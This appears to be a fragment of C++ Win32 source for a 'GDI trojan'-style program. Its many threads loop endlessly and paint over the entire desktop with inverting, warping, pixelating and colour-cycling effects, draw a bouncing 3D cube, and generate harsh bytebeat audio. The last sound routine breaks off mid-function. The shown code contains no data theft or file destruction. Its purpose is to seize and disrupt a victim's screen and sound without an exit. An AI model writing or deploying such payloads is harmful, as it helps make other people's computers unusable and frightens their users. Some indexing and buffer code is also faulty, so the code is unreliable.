DWORD WINAPI blur1(LPVOID lpParam) {
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int rndsize = 1 + rand() % 40;
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        AlphaBlend(hcdc, 10 - rand() % 20, 10 - rand() % 20, w, h, hdc, 0, 0, w, h, blur);
        for (int i = 0; i < h; i += rndsize) {
            StretchBlt(hcdc, -3 + (rand() % 7), i, w, rndsize, hcdc, 0, i, w, rndsize, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader8(LPVOID lpParam) {
    int xxx = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* pBits = nullptr;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y + x * h;
                double wave = tan((x + xxx) * 0.02) + sqrt((y + xxx) * 0.02);
                pBits[index].rgbRed = (256 * sqrt(wave) * 0.8);
                pBits[index].rgbGreen = (512 * tan(wave) * 1.2);
                pBits[index].rgbBlue = (1024 * sin(wave) * 1.6);
            }
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        xxx += 10;
    }
    return 0;
}

DWORD WINAPI shader9(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor; RGBQUAD rgbquadCopy;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = w * y + x;
                int fx = (int)((x * i) | (y * i)) | (x - i) ^ (y - i);
                rgbquad[index].rgbRed = fx + i;
                rgbquad[index].rgbGreen = fx + i;
                rgbquad[index].rgbBlue = fx + i;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        i += 2;
    }
    return 0;
}

DWORD WINAPI shader10(LPVOID lpParam) {
    int xxx = 0; BLENDFUNCTION blend = { AC_SRC_OVER, 0, 80, 0 };
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* pBits = nullptr;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x + y * w;
                double wave = sin((x + xxx) * 0.06) + cos((y + xxx) * 0.06);
                pBits[index].rgbRed += (512 * cos(wave) * 0.4);
                pBits[index].rgbGreen += (256 * sqrt(wave) * 0.6);
                pBits[index].rgbBlue += (1024 * tan(wave) * 0.8);
            }
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blend);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        xxx += 5;
    }
    return 0;
}

DWORD WINAPI pixels(LPVOID lpParam) {
    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 100, 0 };
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x += 30) {
            for (int y = 0; y < h; y += 30) {
                StretchBlt(hcdc, x, y, 30, 30, hcdc, x, y, 2, 2, SRCCOPY);
            }
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blend);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI pathell(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hcdc, hBrush);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        PatBlt(hcdc, 0, 0, w, h, PATINVERT);
        StretchBlt(hcdc, -6, -6, w + 12, h + 12, hcdc, 0, 0, w, h, !(rand() % 2) ? SRCAND : SRCPAINT);
        BitBlt(hcdc, rand() % 20, rand() % 20, w, h, hcdc, rand() % 20, rand() % 20, SRCCOPY);
        for (int x = 0; x < w; x += 20) {
            StretchBlt(hcdc, x, -5 + rand() % 10, 20, h, hcdc, x, 0, 20, h, !(rand() % 2) ? SRCAND : SRCPAINT);
        }
        for (int y = 0; y < h; y += 20) {
            StretchBlt(hcdc, -5 + rand() % 10, y, w, 20, hcdc, 0, y, w, 20, !(rand() % 2) ? SRCAND : SRCPAINT);
        }
        for (int i = 0; i < h; i++) {
            StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap); DeleteObject(hBrush);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader11(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)(x + i) * (y + i);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h += (DOUBLE)(FLOAT)fmod(fx / 500.f, 1.f);
                hslcolor.s = 1.f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i += 5;
    }
}

DWORD WINAPI shader12(LPVOID lpParam) {
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 60, 0 };
    int size = 450;
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            INT x = (i * i) % w, y = (i & i) ^ w;
            rgbScreen[i].rgb += (x * y) | (i + w + h) * i;
        }
        for (int i = 0; i < 10; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCERASE);
        }
        for (int i = 0; i < 10; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, !(rand() % 2) ? SRCAND : SRCPAINT);
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader13(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbScreen[i].rgb += x ^ i * y ^ x;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader14(LPVOID lpParam) {
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (y + (i + i * 50));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 200.f + y / h * .500f, 1.f);
                hslcolor.s = 0.99f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI screen(LPVOID lpParam) {
    int sw = 450, sh = 270;
    int sx = 1, sy = 1;
    int incrementor = 10;
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int x = rand() % (w - sw);
    int y = rand() % (h - sh);
    while (true) {
        x += incrementor * sx;
        y += incrementor * sy;
        HDC hdc = GetDC(0);
        StretchBlt(hdc, x, y, sw, sh, hdc, 0, 0, w, h, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
        if (y >= h - sh) { sy = -1; }
        else if (x >= w - sw) { sx = -1; }
        else if (y <= 0) { sy = 1; }
        else if (x <= 0) { sx = 1; }
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI shader15(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, -1, 0, w, h, hcdc, 0, 0, !(rand() % 2) ? SRCAND : SRCPAINT);
        BitBlt(hcdc, 0, 1, w, h, hcdc, 0, 0, !(rand() % 2) ? SRCAND : SRCPAINT);
        BitBlt(hcdc, 1, 0, w, h, hcdc, 0, 0, !(rand() % 2) ? SRCAND : SRCPAINT);
        BitBlt(hcdc, 0, -1, w, h, hcdc, 0, 0, !(rand() % 2) ? SRCAND : SRCPAINT);
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb -= ((i | w) + h) | ((i * 4) + (i / h));
        }
        for (int y = 0; y < h; y += 40) {
            StretchBlt(hcdc, -1 + rand() % 3, y, w, 40, hcdc, 0, y, w, 40, !(rand() % 2) ? SRCAND : SRCPAINT);
        }
        for (int x = 0; x < w; x += 40) {
            StretchBlt(hcdc, x, -1 + rand() % 3, 40, h, hcdc, x, 0, 40, h, !(rand() % 2) ? SRCAND : SRCPAINT);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
}

DWORD WINAPI shader16(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = ((y + (10 * i)) ^ x) + (i * 10);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h += fmod(fx / 200.f + y / h * .2f, 1.f);
                hslcolor.s = 1.f;  hslcolor.l += 1.f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader17(LPVOID lpParam) {
    int i = 0, xxx = 0;
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int rndsize = 1 + rand() % 40;
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* pBits = nullptr;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int xxx = 0; xxx < w; xxx += rndsize) {
            StretchBlt(hcdc, xxx, -5 + (rand() % 11), rndsize, h, hcdc, xxx, 0, rndsize, h, SRCCOPY);
        }
        for (int xxx = 0; xxx < h; xxx += rndsize) {
            StretchBlt(hcdc, -5 + (rand() % 11), xxx, w, rndsize, hcdc, 0, xxx, w, rndsize, SRCCOPY);
        }
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y + x * h; float aaa = (i % w) + (i / w);
                pBits[index].rgbRed += (sin(aaa) * 127 + 128);
                pBits[index].rgbGreen += (cos(aaa + 2) * 127 + 128);
                pBits[index].rgbBlue += (tan(aaa + 4) * 127 + 128);
            }
        }
        for (int kun = 0; kun < 2; kun++) {
            int x = rand() % w, y = rand() % h;
            HRGN hrgn = CreateEllipticRgn(x, y, x + 240, y + 240);
            SelectClipRgn(hcdc, hrgn);
            HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hcdc, hBrush);
            BitBlt(hcdc, x, y, w, h, hcdc, x, y, PATINVERT);
            DeleteObject(hrgn); DeleteObject(hBrush);
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i++;
    }
    return 0;
}

DWORD WINAPI shader18(LPVOID lpParam) {
    HBRUSH hBrush;
    int size = 128;
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x * h + y;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(0, 0);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int x = 0; x < w; x += size) {
            for (int y = 0; y < h; y += size) {
                hBrush = CreateSolidBrush(RGB((rand() % 65) * 4, rand() % 255, (rand() % 33) * 8));
                SelectObject(hcdc, hBrush);
                PatBlt(hcdc, x, 0, size, h, PATINVERT);
                DeleteObject(hBrush);
                hBrush = CreateSolidBrush(RGB((rand() % 65) * 4, rand() % 255, (rand() % 33) * 8));
                SelectObject(hcdc, hBrush);
                PatBlt(hcdc, 0, y, w, size, PATINVERT);
                DeleteObject(hBrush);
            }
        }
        for (int x = 0; x < w; x += 50) {
            StretchBlt(hcdc, x, -20 + rand() % 40, 50, h, hcdc, x, 0, 50, h, !(rand() % 2) ? SRCAND : SRCPAINT);
        }
        for (int y = 0; y < h; y += 50) {
            StretchBlt(hcdc, -20 + rand() % 40, y, w, 50, hcdc, 0, y, w, 50, !(rand() % 2) ? SRCAND : SRCPAINT);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
    }
    return 0;
}

DWORD WINAPI shader19(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        PRGBQUAD rgbScreen = { 0 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int luckynum = rand() % 30;
            if (luckynum <= 10) { rgbScreen[i].rgb = 0; }
            else if (luckynum > 10 && luckynum <= 20) { rgbScreen[i].rgb = 7237230; }
            else { rgbScreen[i].rgb = 14474460; }
        }
        for (int x = 0; x < w; x += 50) {
            for (int y = 0; y < h; y += 50) {
                StretchBlt(hcdc, x, y, 50, 50, hcdc, x, y, 12, 12, SRCCOPY);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
    return 0;
}

struct Point3D {
    float x, y, z;
};

void DrawEllipseAt(HDC hdc, int x, int y, int color) {
    HBRUSH hBrush = CreateSolidBrush(color);
    SelectObject(hdc, hBrush);
    Ellipse(hdc, x - 10, y - 10, x + 20, y + 20);
    DeleteObject(hBrush);
}

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
    float cosX = cos(angleX), sinX = sin(angleX);
    float cosY = cos(angleY), sinY = sin(angleY);
    float cosZ = cos(angleZ), sinZ = sin(angleZ);
    float y = point.y * cosX - point.z * sinX;
    float z = point.y * sinX + point.z * cosX;
    point.y = y; point.z = z;
    float x = point.x * cosY + point.z * sinY;
    z = -point.x * sinY + point.z * cosY;
    point.x = x; point.z = z;
    x = point.x * cosZ - point.y * sinZ;
    y = point.x * sinZ + point.y * cosZ;
    point.x = x; point.y = y;
    return point;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA, float color) {
    Point3D vertices[8] = {
        {-size, -size, -size},
        {size, -size, -size},
        {size, size, -size},
        {-size, size, -size},
        {-size, -size, size},
        {size, -size, size},
        {size, size, size},
        {-size, size, size},
    };
    POINT screenPoints[8];
    for (int i = 0; i < 8; ++i) {
        Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
        int screenX = static_cast<int>(center.x + rotated.x);
        int screenY = static_cast<int>(center.y + rotated.y);
        screenPoints[i].x = screenX;
        screenPoints[i].y = screenY;
        DrawEllipseAt(hdc, screenX, screenY, color);
    }
    POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
    Polyline(hdc, polyline1, 5);
    POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
    Polyline(hdc, polyline2, 5);
    POINT connectingLines[8] = {
        screenPoints[0], screenPoints[4],
        screenPoints[1], screenPoints[5],
        screenPoints[2], screenPoints[6],
        screenPoints[3], screenPoints[7]
    };
    Polyline(hdc, &connectingLines[0], 2);
    Polyline(hdc, &connectingLines[2], 2);
    Polyline(hdc, &connectingLines[4], 2);
    Polyline(hdc, &connectingLines[6], 2);
}

DWORD WINAPI cube(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int wdpi = GetDeviceCaps(hdc, 88);
    int hdpi = GetDeviceCaps(hdc, 90);
    ReleaseDC(0, hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int x = w * wdpi / 96;
    int y = h * hdpi / 96;
    int signX = 1;
    int signY = 1;
    int incrementor = 10;
    float x2 = 100.0;
    float y2 = 100.0;
    float angleX = 0.0, angleY = 0.0, angleZ = 0.0;
    float angleIncrement = 0.04;
    float colorA = 0;
    float size = 100;
    while (true) {
        hdc = GetDC(0);
        x2 += incrementor * signX;
        y2 += incrementor * signY;
        if (x2 + 75 >= x) {
            signX = -1; x2 = x - 76;
        }
        else if (x2 <= 75) {
            signX = 1; x2 = 76;
        }
        if (y2 + 75 >= y) {
            signY = -1; y2 = y - 76;
        }
        else if (y2 <= 75) {
            signY = 1; y2 = 76;
        }
        Point3D center = { x2, y2, 0.0f };
        int color = Hue(239);
        HPEN hPen = CreatePen(0, 8, color);
        SelectObject(hdc, hPen);
        Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA, color);
        ReleaseDC(0, hdc);
        DeleteObject(hPen);
        DeleteDC(hdc);
        angleX += angleIncrement;
        angleY += angleIncrement;
        angleZ += angleIncrement;
        Sleep(10);
        colorA += 1;
        if (size >= 0 && size <= 100) {
            size += 0.5;
        }
    }
    return 0;
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & 114 >> (t + 5) / 5) | (t << 12 - rand() % 11 + t << 46 - rand() % 45 + t >> 15 - rand() % 14));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t | (5 * t >> 11 & 5 * t >> 1));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t >> 11) | (t >> 5)) + t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * (t >> 6)) ^ (t << t) | t * rand());

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t ^ t >> 114) + (t ^ t >> 51 + t ^ t << 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
